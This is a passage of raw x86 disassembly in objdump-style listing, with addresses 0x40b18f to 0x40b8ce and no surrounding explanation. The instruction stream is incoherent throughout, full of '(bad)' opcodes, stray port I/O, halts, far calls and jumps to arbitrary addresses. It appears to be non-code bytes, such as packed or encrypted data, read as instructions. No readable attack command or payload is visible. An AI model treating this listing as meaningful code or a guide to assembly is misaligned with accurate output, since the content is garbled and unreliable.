  40b18f:	or     BYTE PTR [edx-0x63],dl
  40b192:	data16 cmp al,0x44
  40b195:	repnz gs call 0xb23c:0x41560618
  40b19e:	pusha  
  40b19f:	push   ebx
  40b1a0:	mov    BYTE PTR [eax+0xb847771],dl
  40b1a6:	aad    0xe4
  40b1a8:	daa    
  40b1a9:	in     al,dx
  40b1aa:	imul   edi,DWORD PTR [edx+0x23],0xf4b1b618
  40b1b1:	in     eax,dx
  40b1b2:	pop    edx
  40b1b3:	jp     0x40b219
  40b1b5:	xchg   esp,eax
  40b1b6:	xchg   ebx,eax
  40b1b7:	cmp    BYTE PTR [ebx+0x1b284fb],dh
  40b1bd:	sahf   
  40b1be:	imul   eax,DWORD PTR [ebx+0x7a],0xdbbcc8f1
  40b1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1c6:	icebp  
  40b1c7:	mov    ah,0x6a
  40b1c9:	jo     0x40b18e
  40b1cb:	xchg   edx,eax
  40b1cc:	repnz push ss
  40b1ce:	dec    esi
  40b1cf:	ror    DWORD PTR [edx-0x14100c21],1
  40b1d5:	fcomp  DWORD PTR [edi]
  40b1d7:	sbb    BYTE PTR [ebx+0x54],0xe1
  40b1db:	mov    WORD PTR [esp+eax*4+0x2829fef5],gs
  40b1e2:	dec    ecx
  40b1e3:	mov    edx,eax
  40b1e5:	sbb    dh,0x7e
  40b1e8:	popf   
  40b1e9:	les    esi,FWORD PTR [ebx]
  40b1eb:	jmp    0x9a59706a
  40b1f0:	pop    esi
  40b1f1:	mov    bl,bh
  40b1f3:	(bad)  
  40b1f4:	jne    0x40b1d7
  40b1f6:	loopne 0x40b17f
  40b1f8:	data16 mov WORD PTR [edi+eax*4+0x75a02b57],?
  40b200:	imul   esi,DWORD PTR [esi+0x6fc3be6b],0xd0132c97
  40b20a:	test   al,0x88
  40b20c:	stc    
  40b20d:	add    al,0xb6
  40b20f:	int    0x1a
  40b211:	ss sbb ah,dl
  40b214:	ins    BYTE PTR es:[edi],dx
  40b215:	sub    ebx,DWORD PTR [edx+0x1f43482b]
  40b21b:	test   DWORD PTR [edi],ecx
  40b21d:	cmp    al,0xb4
  40b21f:	adc    DWORD PTR [esi+0x629282c3],edi
  40b225:	or     esp,DWORD PTR [ebp-0x34c8e51e]
  40b22b:	in     eax,0x62
  40b22d:	jb     0x40b1c7
  40b22f:	cmp    eax,ecx
  40b231:	mov    al,ds:0x6d63bbfd
  40b236:	pop    esp
  40b237:	cmp    eax,0x3f0ad8af
  40b23c:	(bad)  
  40b23d:	mov    edx,0xc011ad6c
  40b242:	gs xchg ebp,eax
  40b244:	hlt    
  40b245:	sar    DWORD PTR [ebp+0x67ef6b11],0x91
  40b24c:	iret   
  40b24d:	jmp    0x8485f379
  40b252:	mov    ds:0x792a215d,eax
  40b257:	dec    ecx
  40b258:	mov    es,WORD PTR [edx-0x446527bd]
  40b25e:	jge    0x40b25e
  40b260:	mov    bh,0x4a
  40b262:	mov    esi,0xd51a4ce6
  40b267:	(bad)  
  40b268:	and    dl,al
  40b26a:	popf   
  40b26b:	stos   BYTE PTR es:[edi],al
  40b26c:	mov    esp,DWORD PTR [ebp+0x22f59c2d]
  40b272:	enter  0x416f,0xa4
  40b276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b277:	xchg   edi,eax
  40b278:	cmc    
  40b279:	ret    0xe83
  40b27c:	mov    ebx,0x945157f2
  40b281:	daa    
  40b282:	mov    dh,0x53
  40b284:	outs   dx,BYTE PTR ds:[esi]
  40b285:	int    0xc4
  40b287:	push   ds
  40b288:	pop    ebp
  40b289:	(bad)  [edi+edi*4+0x37]
  40b28d:	mov    bh,0xe6
  40b28f:	pop    ds
  40b290:	je     0x40b264
  40b292:	jnp    0x40b30b
  40b294:	sub    eax,0x22b6f92a
  40b299:	and    BYTE PTR [esi+0x1ccb42a6],cl
  40b29f:	inc    esp
  40b2a0:	repz mov dh,0xdb
  40b2a3:	out    0xc4,al
  40b2a5:	pop    ebp
  40b2a6:	rcl    ebx,0x49
  40b2a9:	push   es
  40b2aa:	ficom  DWORD PTR [edx]
  40b2ac:	add    DWORD PTR [edx+0x41e2b388],esi
  40b2b2:	mov    al,0x7a
  40b2b4:	retf   0x2849
  40b2b7:	mov    ds:0x1fb48804,al
  40b2bc:	push   edx
  40b2bd:	pop    ecx
  40b2be:	xchg   esi,eax
  40b2bf:	mov    al,ds:0x5ddd2a0b
  40b2c4:	js     0x40b2a1
  40b2c6:	jns    0x40b311
  40b2c8:	test   DWORD PTR [edi-0x27348fea],edi
  40b2ce:	int    0x34
  40b2d0:	jmp    DWORD PTR [eax-0x3f]
  40b2d3:	jns    0x40b2eb
  40b2d5:	sbb    eax,0x7b15e7d0
  40b2da:	popa   
  40b2db:	lds    esp,FWORD PTR [ebp+0x18]
  40b2de:	mov    esi,0xb316f0af
  40b2e3:	js     0x40b34a
  40b2e5:	or     eax,0x7ad6c56e
  40b2ea:	ret    0x788e
  40b2ed:	ds test al,0x93
  40b2f0:	bound  edx,QWORD PTR [eax+0x62]
  40b2f3:	lods   eax,DWORD PTR ds:[esi]
  40b2f4:	push   ebx
  40b2f5:	or     DWORD PTR ds:[esi+0x1f],eax
  40b2f9:	add    BYTE PTR [esi],dl
  40b2fb:	sbb    al,0xe
  40b2fd:	sahf   
  40b2fe:	stos   DWORD PTR es:[edi],eax
  40b2ff:	(bad)  
  40b300:	mov    al,0xd2
  40b302:	je     0x40b30a
  40b304:	outs   dx,DWORD PTR ds:[esi]
  40b305:	in     al,dx
  40b306:	retf   
  40b307:	aad    0xd1
  40b309:	popa   
  40b30a:	in     eax,dx
  40b30b:	adc    BYTE PTR [esi],cl
  40b30d:	mov    esp,esi
  40b30f:	mov    esi,0x5921ff95
  40b314:	imul   esi,eax,0x40
  40b317:	xchg   DWORD PTR [esi+0x2f5e97ab],edi
  40b31d:	outs   dx,BYTE PTR ds:[esi]
  40b31e:	cmp    ah,ch
  40b320:	mov    esp,0xa131f04
  40b325:	push   ecx
  40b326:	pusha  
  40b327:	adc    eax,esp
  40b329:	xchg   edi,eax
  40b32a:	ss scas eax,DWORD PTR es:[edi]
  40b32c:	nop
  40b32d:	iret   
  40b32e:	mov    DWORD PTR [esi],edi
  40b330:	xchg   esi,eax
  40b331:	jp     0x40b30b
  40b333:	mov    esp,DWORD PTR [ebp-0x2c464b50]
  40b339:	push   es
  40b33a:	test   al,0x5f
  40b33c:	in     al,0xc5
  40b33e:	gs int3 
  40b340:	daa    
  40b341:	xor    DWORD PTR [edx],esi
  40b343:	xchg   DWORD PTR [esi],edx
  40b345:	arpl   WORD PTR [eax+0x2f],bp
  40b348:	jecxz  0x40b3c9
  40b34a:	adc    cl,BYTE PTR [edx+ebp*1-0x3a45a769]
  40b351:	pop    edi
  40b352:	xchg   esp,eax
  40b353:	jl     0x40b2ff
  40b355:	out    0x4e,eax
  40b357:	push   esp
  40b358:	xchg   esi,eax
  40b359:	add    DWORD PTR ds:0xdaf10619,0xcb8f53e2
  40b363:	int3   
  40b364:	jmp    0xebad:0x82654bc7
  40b36b:	pop    ds
  40b36c:	call   0x30ed94bd
  40b371:	outs   dx,DWORD PTR ds:[esi]
  40b372:	mov    WORD PTR ss:[edi],?
  40b375:	mov    eax,ds:0xb9fbfb03
  40b37a:	jp     0x40b3a9
  40b37c:	sbb    al,0xe
  40b37e:	imul   esi,DWORD PTR [ecx-0x52],0xca2bf35a
  40b385:	sub    eax,0x38d782af
  40b38a:	imul   bp,WORD PTR ss:[ebp+0x55],0xff91
  40b390:	mov    ch,0x4d
  40b392:	stos   DWORD PTR es:[edi],eax
  40b393:	ins    DWORD PTR es:[edi],dx
  40b394:	xor    dh,ch
  40b396:	mov    eax,ds:0x93dc539b
  40b39b:	mov    ecx,DWORD PTR [ebp-0x32c7ac80]
  40b3a1:	xchg   BYTE PTR [eax-0xc],ah
  40b3a4:	xor    DWORD PTR [edi-0x4cc8afd5],edx
  40b3aa:	pop    ebp
  40b3ab:	ror    BYTE PTR [edx],0x99
  40b3ae:	push   cs
  40b3af:	int3   
  40b3b0:	jbe    0x40b40c
  40b3b2:	in     al,0xd8
  40b3b4:	loope  0x40b3ca
  40b3b6:	pop    ebx
  40b3b7:	stos   DWORD PTR es:[edi],eax
  40b3b8:	pop    edi
  40b3b9:	xor    ah,dh
  40b3bb:	or     ecx,eax
  40b3bd:	scas   eax,DWORD PTR es:[edi]
  40b3be:	cdq    
  40b3bf:	aaa    
  40b3c0:	xchg   ebp,eax
  40b3c1:	mov    al,ds:0xa025b738
  40b3c6:	mov    ah,0xb8
  40b3c8:	nop
  40b3c9:	cmp    al,0xee
  40b3cb:	ror    BYTE PTR [esi+0x23],1
  40b3ce:	hlt    
  40b3cf:	inc    ebp
  40b3d0:	xchg   cx,ax
  40b3d2:	fnstsw WORD PTR [edi+ebx*8+0x4c]
  40b3d6:	inc    edi
  40b3d7:	add    al,0x3a
  40b3d9:	and    BYTE PTR [ebp+0xfe9f8b7],al
  40b3df:	xchg   ecx,eax
  40b3e0:	mov    dl,0xf8
  40b3e2:	test   ch,ah
  40b3e4:	bound  edi,QWORD PTR [edx+0x36e655bf]
  40b3ea:	out    0xf0,eax
  40b3ec:	pop    ss
  40b3ed:	adc    edi,DWORD PTR [ebp-0x63150dc4]
  40b3f3:	or     cl,BYTE PTR [edi]
  40b3f5:	imul   BYTE PTR [eax]
  40b3f7:	inc    esi
  40b3f8:	and    DWORD PTR [ebx],ebx
  40b3fa:	push   ebx
  40b3fb:	or     BYTE PTR [ebp-0xf3b4abe],ch
  40b401:	pop    ebx
  40b402:	pop    esi
  40b403:	mov    dh,0xb4
  40b405:	fldenv [edi-0x40]
  40b408:	loopne 0x40b44c
  40b40a:	pop    ebp
  40b40b:	retf   
  40b40c:	add    bx,WORD PTR [ecx-0x3158d6e]
  40b413:	shl    BYTE PTR [esi],1
  40b415:	xchg   esi,eax
  40b416:	cmp    BYTE PTR [esi+0x608b71cc],al
  40b41c:	adc    DWORD PTR [edi-0x5],edx
  40b41f:	sti    
  40b420:	push   edi
  40b421:	(bad)  
  40b422:	outs   dx,BYTE PTR ds:[esi]
  40b423:	out    0x45,eax
  40b425:	sub    DWORD PTR [ebx+ebx*1+0x1d],0xbca94d43
  40b42d:	aaa    
  40b42e:	xchg   DWORD PTR [edi-0x2c4597cb],esi
  40b434:	mov    edx,0x2e62d174
  40b439:	rol    bl,0x94
  40b43c:	add    ch,bh
  40b43e:	fs inc esi
  40b440:	adc    al,0x5a
  40b442:	loopne 0x40b4b5
  40b444:	or     al,0xf7
  40b446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b447:	ret    
  40b448:	pop    esi
  40b449:	inc    esi
  40b44a:	mov    al,0xa
  40b44c:	inc    eax
  40b44d:	hlt    
  40b44e:	(bad)  
  40b44f:	out    dx,eax
  40b450:	dec    ecx
  40b451:	loop   0x40b470
  40b453:	fld    DWORD PTR [edi-0x73]
  40b456:	sub    BYTE PTR [ecx+esi*1+0x11],dh
  40b45a:	mov    cl,0xb8
  40b45c:	cdq    
  40b45d:	mov    dl,0xa9
  40b45f:	add    eax,0xe99da2c4
  40b464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b465:	push   edi
  40b466:	inc    ebp
  40b467:	fnstsw WORD PTR [eax-0x76f812c4]
  40b46d:	push   cs
  40b46e:	and    eax,0x819ab2ff
  40b473:	lahf   
  40b474:	mov    dh,0x43
  40b476:	inc    ecx
  40b477:	pushf  
  40b478:	dec    esp
  40b479:	stc    
  40b47a:	stc    
  40b47b:	and    BYTE PTR [ecx-0x6dc65450],bl
  40b481:	cmp    bl,BYTE PTR [ebx-0x3d]
  40b484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b485:	jae    0x40b4bc
  40b487:	push   0x29ba524c
  40b48c:	int    0x45
  40b48e:	ficom  WORD PTR [ecx+0x1a]
  40b491:	in     al,dx
  40b492:	shl    BYTE PTR [ecx+0x2b105712],1
  40b498:	push   esi
  40b499:	adc    al,0x56
  40b49b:	mov    esi,0x90ddb733
  40b4a0:	mov    WORD PTR [edi],?
  40b4a2:	push   edi
  40b4a3:	fdivr  DWORD PTR [esi-0x66dd6ec5]
  40b4a9:	xor    DWORD PTR [esi],ebp
  40b4ab:	dec    ebx
  40b4ac:	fdivr  QWORD PTR [ebp-0x3c5905be]
  40b4b2:	test   DWORD PTR [ebp-0x6d],eax
  40b4b5:	pop    edi
  40b4b6:	xchg   ebp,eax
  40b4b7:	mul    BYTE PTR [ecx+0x7a]
  40b4ba:	xlat   BYTE PTR ds:[ebx]
  40b4bb:	cdq    
  40b4bc:	dec    edx
  40b4bd:	pop    ebp
  40b4be:	push   esi
  40b4bf:	repz mov bl,bh
  40b4c2:	cmp    al,al
  40b4c4:	outs   dx,BYTE PTR ds:[esi]
  40b4c5:	pop    ebp
  40b4c6:	sbb    bl,BYTE PTR ds:0x8d4f074f
  40b4cc:	mov    eax,0xfa80324f
  40b4d1:	add    al,0x96
  40b4d3:	jmp    0x8365e221
  40b4d8:	sub    eax,DWORD PTR [ecx+0x3df72b7b]
  40b4de:	and    ebp,ebx
  40b4e0:	repz and DWORD PTR [edx-0x1776e39],eax
  40b4e7:	popf   
  40b4e8:	push   eax
  40b4e9:	pop    eax
  40b4ea:	iret   
  40b4eb:	add    eax,0x4fd9efb3
  40b4f0:	or     ecx,esi
  40b4f2:	or     BYTE PTR [eax-0x16],dl
  40b4f5:	lods   eax,DWORD PTR ds:[esi]
  40b4f6:	and    ch,bl
  40b4f8:	loop   0x40b53b
  40b4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4fb:	je     0x40b514
  40b4fd:	lods   al,BYTE PTR ds:[esi]
  40b4fe:	ror    DWORD PTR [ecx-0x58],1
  40b501:	sub    al,0x31
  40b503:	call   0xcdd0:0xd009c309
  40b50a:	sub    edx,edi
  40b50c:	jne    0x40b515
  40b50e:	sbb    ah,dh
  40b510:	in     al,0x30
  40b512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b513:	xchg   ebx,eax
  40b514:	shl    DWORD PTR [edi+ebp*1+0x16c00013],0x5d
  40b51c:	mov    edx,0x5e1b7fe8
  40b521:	cld    
  40b522:	pop    es
  40b523:	popf   
  40b524:	fmulp  st(6),st
  40b526:	(bad)  
  40b527:	lock imul edx,esi,0xffffffc2
  40b52b:	call   0x36268754
  40b530:	jle    0x40b56f
  40b532:	xchg   ecx,eax
  40b533:	daa    
  40b534:	hlt    
  40b535:	or     bh,al
  40b537:	jl     0x40b56c
  40b539:	jnp    0x40b567
  40b53b:	dec    ebp
  40b53c:	xchg   esp,eax
  40b53d:	xchg   BYTE PTR [eax+0x1],ch
  40b540:	mov    ecx,edx
  40b542:	add    dh,BYTE PTR [edx-0x58]
  40b545:	mov    ch,0x92
  40b547:	call   0xcc29:0x485235b
  40b54e:	jle    0x40b591
  40b550:	xchg   BYTE PTR [esi+ebp*4],ah
  40b553:	repnz fdiv DWORD PTR [ebx+0x3]
  40b557:	mov    edi,0xe174af9f
  40b55c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b55d:	mov    edx,0x62d4c23e
  40b562:	ja     0x40b536
  40b564:	retf   
  40b565:	test   al,0xd5
  40b567:	loopne 0x40b5af
  40b569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56a:	add    DWORD PTR [esi+esi*2+0x25],eax
  40b56e:	mov    DWORD PTR [edx],esp
  40b570:	mov    cl,BYTE PTR [esi+0x5d]
  40b573:	fs mov dh,0x31
  40b576:	dec    eax
  40b577:	(bad)  
  40b578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b579:	data16 sbb al,0x7c
  40b57c:	mov    ecx,ds
  40b57e:	(bad)  
  40b580:	xor    edx,DWORD PTR [esi-0x4c]
  40b583:	xor    bh,BYTE PTR [ecx]
  40b585:	mov    dl,0xb6
  40b587:	jmp    ebx
  40b589:	and    al,0xd8
  40b58b:	mov    bl,0x1a
  40b58d:	mov    ds:0x7763022c,eax
  40b592:	in     eax,0xf8
  40b594:	enter  0x3a4e,0xe8
  40b598:	aaa    
  40b599:	add    eax,0x503f415f
  40b59e:	push   edi
  40b59f:	push   0x7d981c64
  40b5a4:	ja     0x40b5f4
  40b5a6:	sub    ebp,ecx
  40b5a8:	outs   dx,DWORD PTR ds:[esi]
  40b5a9:	call   0xb0c7:0x5587b88
  40b5b0:	aaa    
  40b5b1:	dec    eax
  40b5b2:	aas    
  40b5b3:	cmp    BYTE PTR [eax-0x56],ah
  40b5b6:	std    
  40b5b7:	out    dx,al
  40b5b8:	in     eax,dx
  40b5b9:	rcr    BYTE PTR [ebx-0x69f6f324],1
  40b5bf:	pop    eax
  40b5c0:	jmp    0x40b618
  40b5c2:	hlt    
  40b5c3:	test   al,0x5a
  40b5c5:	jl     0x40b5d8
  40b5c7:	mov    bh,BYTE PTR [esi-0x4d4ae326]
  40b5cd:	loopne 0x40b5c2
  40b5cf:	ds sbb al,cl
  40b5d2:	jle    0x40b62a
  40b5d4:	mov    cl,al
  40b5d6:	fmul   DWORD PTR [edx+0x7f2cdd9f]
  40b5dc:	sahf   
  40b5dd:	xchg   ecx,eax
  40b5de:	int3   
  40b5df:	inc    ebp
  40b5e0:	jecxz  0x40b614
  40b5e2:	xchg   ebp,eax
  40b5e3:	or     BYTE PTR [eax+0x3b],0x9d
  40b5e7:	ret    0xbbd6
  40b5ea:	lea    eax,[ebp+0x11]
  40b5ed:	push   edx
  40b5ee:	xor    eax,0x4ec36ffa
  40b5f3:	push   esp
  40b5f4:	jnp    0x40b5e2
  40b5f6:	fisub  DWORD PTR [esi+0x3113cfc8]
  40b5fc:	add    eax,0xacd3dbfe
  40b601:	sbb    bl,BYTE PTR [eax+0x4]
  40b604:	push   ss
  40b605:	push   esi
  40b606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b607:	mov    esp,0xed91c0dd
  40b60c:	mov    WORD PTR [eax],?
  40b60e:	stos   BYTE PTR es:[edi],al
  40b60f:	outs   dx,BYTE PTR ds:[esi]
  40b610:	loop   0x40b62f
  40b612:	or     ah,BYTE PTR [esi-0x2e]
  40b615:	enter  0x7173,0xab
  40b619:	adc    bl,BYTE PTR [edx+ecx*1]
  40b61c:	inc    edi
  40b61d:	jle    0x40b5de
  40b61f:	ror    BYTE PTR [esi],cl
  40b621:	dec    ecx
  40b622:	sub    BYTE PTR [ebx-0x5b6159cf],dh
  40b628:	and    bl,cl
  40b62a:	jecxz  0x40b5c6
  40b62c:	call   0x7b43:0xdfe23a7d
  40b633:	sub    cl,BYTE PTR [ecx+0x56e98a04]
  40b639:	fdivr  st(6),st
  40b63b:	in     al,0x66
  40b63d:	(bad)  [ebx+0x754bf02b]
  40b643:	or     ebx,DWORD PTR [edx+0x5d]
  40b646:	lea    edi,[edx+ebx*8-0x1e]
  40b64a:	nop
  40b64b:	mov    dh,0xf1
  40b64d:	(bad)  
  40b64e:	call   0x3b812079
  40b653:	es add eax,0xfe931636
  40b659:	xchg   BYTE PTR [ebp+0x17888066],al
  40b65f:	inc    esp
  40b660:	jge    0x40b65d
  40b662:	rcl    DWORD PTR [eax+esi*2+0x7b],cl
  40b666:	pop    esp
  40b667:	adc    dh,BYTE PTR [ebx]
  40b669:	or     ecx,DWORD PTR [edi+0x3a]
  40b66c:	fstp   TBYTE PTR [edx+0x75]
  40b66f:	dec    edx
  40b670:	mov    edi,0x1a59d838
  40b675:	sub    al,0x61
  40b677:	pop    edx
  40b678:	iret   
  40b679:	retf   0x4f2d
  40b67c:	mov    ds:0xc2f607f1,eax
  40b681:	fldcw  WORD PTR [ebx+0x1e6915ef]
  40b687:	cmp    al,0xc5
  40b689:	jmp    FWORD PTR [eax+0x7d]
  40b68c:	sub    DWORD PTR [edi],0x8a64d096
  40b692:	xchg   BYTE PTR [ecx-0x28],ah
  40b695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b696:	inc    esi
  40b697:	pop    ds
  40b698:	or     al,0xf9
  40b69a:	adc    ecx,DWORD PTR [esi-0x55]
  40b69d:	shl    dh,1
  40b69f:	icebp  
  40b6a0:	dec    edx
  40b6a1:	data16 xor dh,ch
  40b6a4:	xchg   DWORD PTR [edx-0x68],ebp
  40b6a7:	dec    ebx
  40b6a8:	pop    ecx
  40b6a9:	adc    eax,0x1ec660bc
  40b6ae:	int3   
  40b6af:	outs   dx,DWORD PTR ds:[esi]
  40b6b0:	pop    edi
  40b6b1:	xchg   esp,eax
  40b6b2:	mov    ebx,0x6e7bad0f
  40b6b7:	call   0x5cfb:0x2324b529
  40b6be:	retf   
  40b6bf:	ror    DWORD PTR [esi],0x36
  40b6c2:	lahf   
  40b6c3:	adc    DWORD PTR [ecx],edx
  40b6c5:	dec    esi
  40b6c6:	ret    
  40b6c7:	add    al,0xd6
  40b6c9:	xor    BYTE PTR [esp+ebp*2+0x1a],dh
  40b6cd:	and    dl,BYTE PTR [ebp+0x5f]
  40b6d0:	mov    eax,ds:0x5acd5eed
  40b6d5:	out    0x6,eax
  40b6d7:	mov    ebx,0x8430794d
  40b6dc:	scas   eax,DWORD PTR es:[edi]
  40b6dd:	xchg   ecx,eax
  40b6de:	popf   
  40b6df:	pop    ds
  40b6e0:	daa    
  40b6e1:	int    0x19
  40b6e3:	je     0x40b6ac
  40b6e5:	ficomp DWORD PTR [ebx+eiz*4+0x0]
  40b6e9:	sub    eax,0x6f7df04a
  40b6ee:	pop    ss
  40b6ef:	(bad)  
  40b6f0:	jmp    0x40b766
  40b6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6f3:	call   FWORD PTR [edi+0x23]
  40b6f6:	cmp    DWORD PTR [ebx-0x36416d83],edi
  40b6fc:	or     BYTE PTR es:[ebp+0x7fccba71],ah
  40b703:	ins    BYTE PTR es:[edi],dx
  40b704:	into   
  40b705:	hlt    
  40b706:	out    dx,al
  40b707:	gs test al,0x76
  40b70a:	xchg   DWORD PTR [ebx+0x2a],eax
  40b70d:	xchg   ebx,eax
  40b70e:	push   ebp
  40b70f:	sbb    al,0x9d
  40b711:	or     DWORD PTR [ebp+eax*8+0x2898ce84],edi
  40b718:	imul   ebx,DWORD PTR [edi+edi*8-0x3e],0xffffff90
  40b71d:	inc    esi
  40b71e:	cwde   
  40b71f:	lea    eax,[eax]
  40b721:	stos   BYTE PTR es:[edi],al
  40b722:	cs rcl cl,1
  40b725:	sar    BYTE PTR [ebp+0x198a5358],1
  40b72b:	fcomp  DWORD PTR [esp+ecx*4+0x278d23ab]
  40b732:	jbe    0x40b719
  40b734:	dec    esi
  40b735:	fisubr DWORD PTR [ecx+0x62c46c6b]
  40b73b:	pop    esi
  40b73c:	dec    ecx
  40b73d:	icebp  
  40b73e:	push   cs
  40b73f:	pop    ebp
  40b740:	sub    bh,BYTE PTR [ebp-0x3]
  40b743:	(bad)
  40b746:	test   DWORD PTR [ebx],ecx
  40b748:	aad    0xa3
  40b74a:	mov    bh,BYTE PTR [esi-0xdd8a875]
  40b750:	mov    edx,0x74a83076
  40b755:	leave  
  40b756:	lea    ecx,[edx]
  40b758:	mov    bh,0x3f
  40b75a:	nop
  40b75b:	lods   eax,DWORD PTR ds:[esi]
  40b75c:	adc    esi,DWORD PTR [eax]
  40b75e:	test   DWORD PTR [ecx],edi
  40b760:	(bad)  
  40b761:	retf   
  40b762:	arpl   dx,bx
  40b764:	(bad)  
  40b765:	(bad)  
  40b766:	mov    gs,WORD PTR [esi]
  40b768:	push   0x3a
  40b76a:	hlt    
  40b76b:	or     BYTE PTR [ecx-0x13],bh
  40b76e:	lahf   
  40b76f:	pop    ecx
  40b770:	popa   
  40b771:	scas   al,BYTE PTR es:[edi]
  40b772:	out    0x6b,al
  40b774:	cdq    
  40b775:	pop    esp
  40b776:	pop    ss
  40b777:	data16 repnz clc 
  40b77a:	lahf   
  40b77b:	push   cs
  40b77c:	(bad)  
  40b77d:	push   DWORD PTR [ebx-0x1ee493e]
  40b783:	test   al,0x6e
  40b785:	xor    bh,BYTE PTR [ecx]
  40b787:	mov    dh,0xe7
  40b789:	push   esi
  40b78a:	pushf  
  40b78b:	cmp    ebp,DWORD PTR [ecx]
  40b78d:	in     al,dx
  40b78e:	jmp    0x40b772
  40b790:	sbb    al,0x1d
  40b792:	inc    edx
  40b793:	dec    ebx
  40b794:	pushf  
  40b795:	scas   eax,DWORD PTR es:[edi]
  40b796:	mov    bl,0xc8
  40b798:	adc    DWORD PTR [eax],edi
  40b79a:	pop    edi
  40b79b:	jnp    0x40b7fa
  40b79d:	inc    esi
  40b79e:	dec    ebx
  40b79f:	dec    esi
  40b7a0:	sub    al,0x8b
  40b7a2:	pop    ecx
  40b7a3:	test   al,cl
  40b7a5:	icebp  
  40b7a6:	pop    edi
  40b7a7:	xchg   edi,eax
  40b7a8:	mov    ah,0x5c
  40b7aa:	add    BYTE PTR [ebx],0x5
  40b7ad:	loop   0x40b7b5
  40b7af:	push   ss
  40b7b0:	gs out 0xd9,eax
  40b7b3:	in     eax,0xdc
  40b7b5:	pushf  
  40b7b6:	stc    
  40b7b7:	cld    
  40b7b8:	xor    DWORD PTR [ebp+0x5c7b1471],eax
  40b7be:	out    0x87,eax
  40b7c0:	mov    ch,0xce
  40b7c2:	ins    BYTE PTR es:[edi],dx
  40b7c3:	or     eax,DWORD PTR [ebp+0x5a9397ac]
  40b7c9:	mov    ss,WORD PTR [edi-0x105456fe]
  40b7cf:	inc    edx
  40b7d0:	xor    DWORD PTR [ebx-0x73070b4],esi
  40b7d6:	(bad)  
  40b7d7:	pop    esp
  40b7d8:	or     eax,0x98f478fe
  40b7dd:	add    BYTE PTR [ebx],ch
  40b7df:	ins    DWORD PTR es:[edi],dx
  40b7e0:	jbe    0x40b7dc
  40b7e2:	rol    BYTE PTR [edx],cl
  40b7e4:	sbb    cl,dl
  40b7e6:	imul   ebx,DWORD PTR [esi+0x1],0xcc1444f0
  40b7ed:	aam    0x78
  40b7ef:	pushf  
  40b7f0:	xor    eax,0x6921762a
  40b7f5:	pusha  
  40b7f6:	mov    DWORD PTR [esi+edi*2+0x5d],0xd2e990f9
  40b7fe:	and    al,0x70
  40b800:	sub    al,0xf4
  40b802:	int    0xe0
  40b804:	fcomp  DWORD PTR [ecx-0x78d2950f]
  40b80a:	call   0xb392680b
  40b80f:	loopne 0x40b7f8
  40b811:	ja     0x40b829
  40b813:	xchg   esp,eax
  40b814:	in     al,0x26
  40b816:	js     0x40b85a
  40b818:	mov    ds:0x139808f3,eax
  40b81d:	push   ss
  40b81e:	lds    edx,FWORD PTR [edx+0x49]
  40b821:	push   ecx
  40b822:	xor    ch,BYTE PTR [edi-0xb64ba1e]
  40b828:	stc    
  40b829:	popf   
  40b82a:	cmp    DWORD PTR [edi+0x7c],edi
  40b82d:	sub    BYTE PTR [eax],cl
  40b82f:	dec    edx
  40b830:	sub    DWORD PTR [edi-0x13693735],ebx
  40b836:	imul   edx,DWORD PTR [ecx-0x1d],0x3e3553ef
  40b83d:	retf   
  40b83e:	inc    ecx
  40b83f:	mov    esi,0x2465c3ad
  40b844:	push   edx
  40b845:	adc    BYTE PTR [esi],al
  40b847:	neg    BYTE PTR [ebx]
  40b849:	pmaxub mm0,QWORD PTR [ebp-0x36d02822]
  40b850:	rcl    BYTE PTR [edx-0x3],1
  40b853:	xchg   esp,eax
  40b854:	sbb    al,0x5f
  40b856:	ja     0x40b7ee
  40b858:	icebp  
  40b859:	adc    DWORD PTR [ecx+eiz*2-0x1460eede],0x238d8fb9
  40b864:	data16 (bad) 
  40b866:	inc    ecx
  40b867:	into   
  40b868:	mov    ah,0xa2
  40b86a:	cmp    esi,eax
  40b86c:	faddp  st(4),st
  40b86e:	adc    al,0xa9
  40b870:	cdq    
  40b871:	mov    ebp,esp
  40b873:	shld   DWORD PTR [edx+0x27],edx,0x86
  40b878:	mov    bl,0xec
  40b87a:	mov    DWORD PTR [ebx+ebx*8-0x395f2e6d],ecx
  40b881:	xor    BYTE PTR [edx],dh
  40b883:	or     ecx,esp
  40b885:	sub    al,0x50
  40b887:	xor    esp,ebx
  40b889:	xchg   ebp,eax
  40b88a:	in     eax,dx
  40b88b:	xchg   edi,eax
  40b88c:	and    eax,0xfcb43899
  40b891:	mov    WORD PTR [eax],es
  40b893:	scas   al,BYTE PTR es:[edi]
  40b894:	add    BYTE PTR [eax],ah
  40b896:	into   
  40b897:	push   esp
  40b898:	mov    cl,0x18
  40b89a:	adc    al,0x48
  40b89c:	xchg   ecx,eax
  40b89d:	popa   
  40b89e:	jnp    0x40b91b
  40b8a0:	in     eax,0x9a
  40b8a2:	add    dl,BYTE PTR [edi]
  40b8a4:	sbb    BYTE PTR [esp+ecx*1-0x1f0f0eed],al
  40b8ab:	adc    ecx,DWORD PTR [edx]
  40b8ad:	stos   DWORD PTR es:[edi],eax
  40b8ae:	outs   dx,DWORD PTR ds:[esi]
  40b8af:	ficom  DWORD PTR [ecx-0x7a]
  40b8b2:	sub    BYTE PTR [ebp+esi*4-0x2186e4ef],ah
  40b8b9:	sub    DWORD PTR [edx+ebp*2-0x30e612f7],edx
  40b8c0:	inc    ebx
  40b8c1:	daa    
  40b8c2:	ins    BYTE PTR es:[edi],dx
  40b8c3:	pop    eax
  40b8c4:	cmp    al,0x21
  40b8c6:	add    bl,BYTE PTR [edx]
  40b8c8:	xchg   esp,eax
  40b8c9:	push   cs
  40b8ca:	into   
  40b8cb:	sti    
  40b8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8cd:	xchg   edi,eax
  40b8ce:	mov    DWORD PTR [esi+0x62984f18],edi
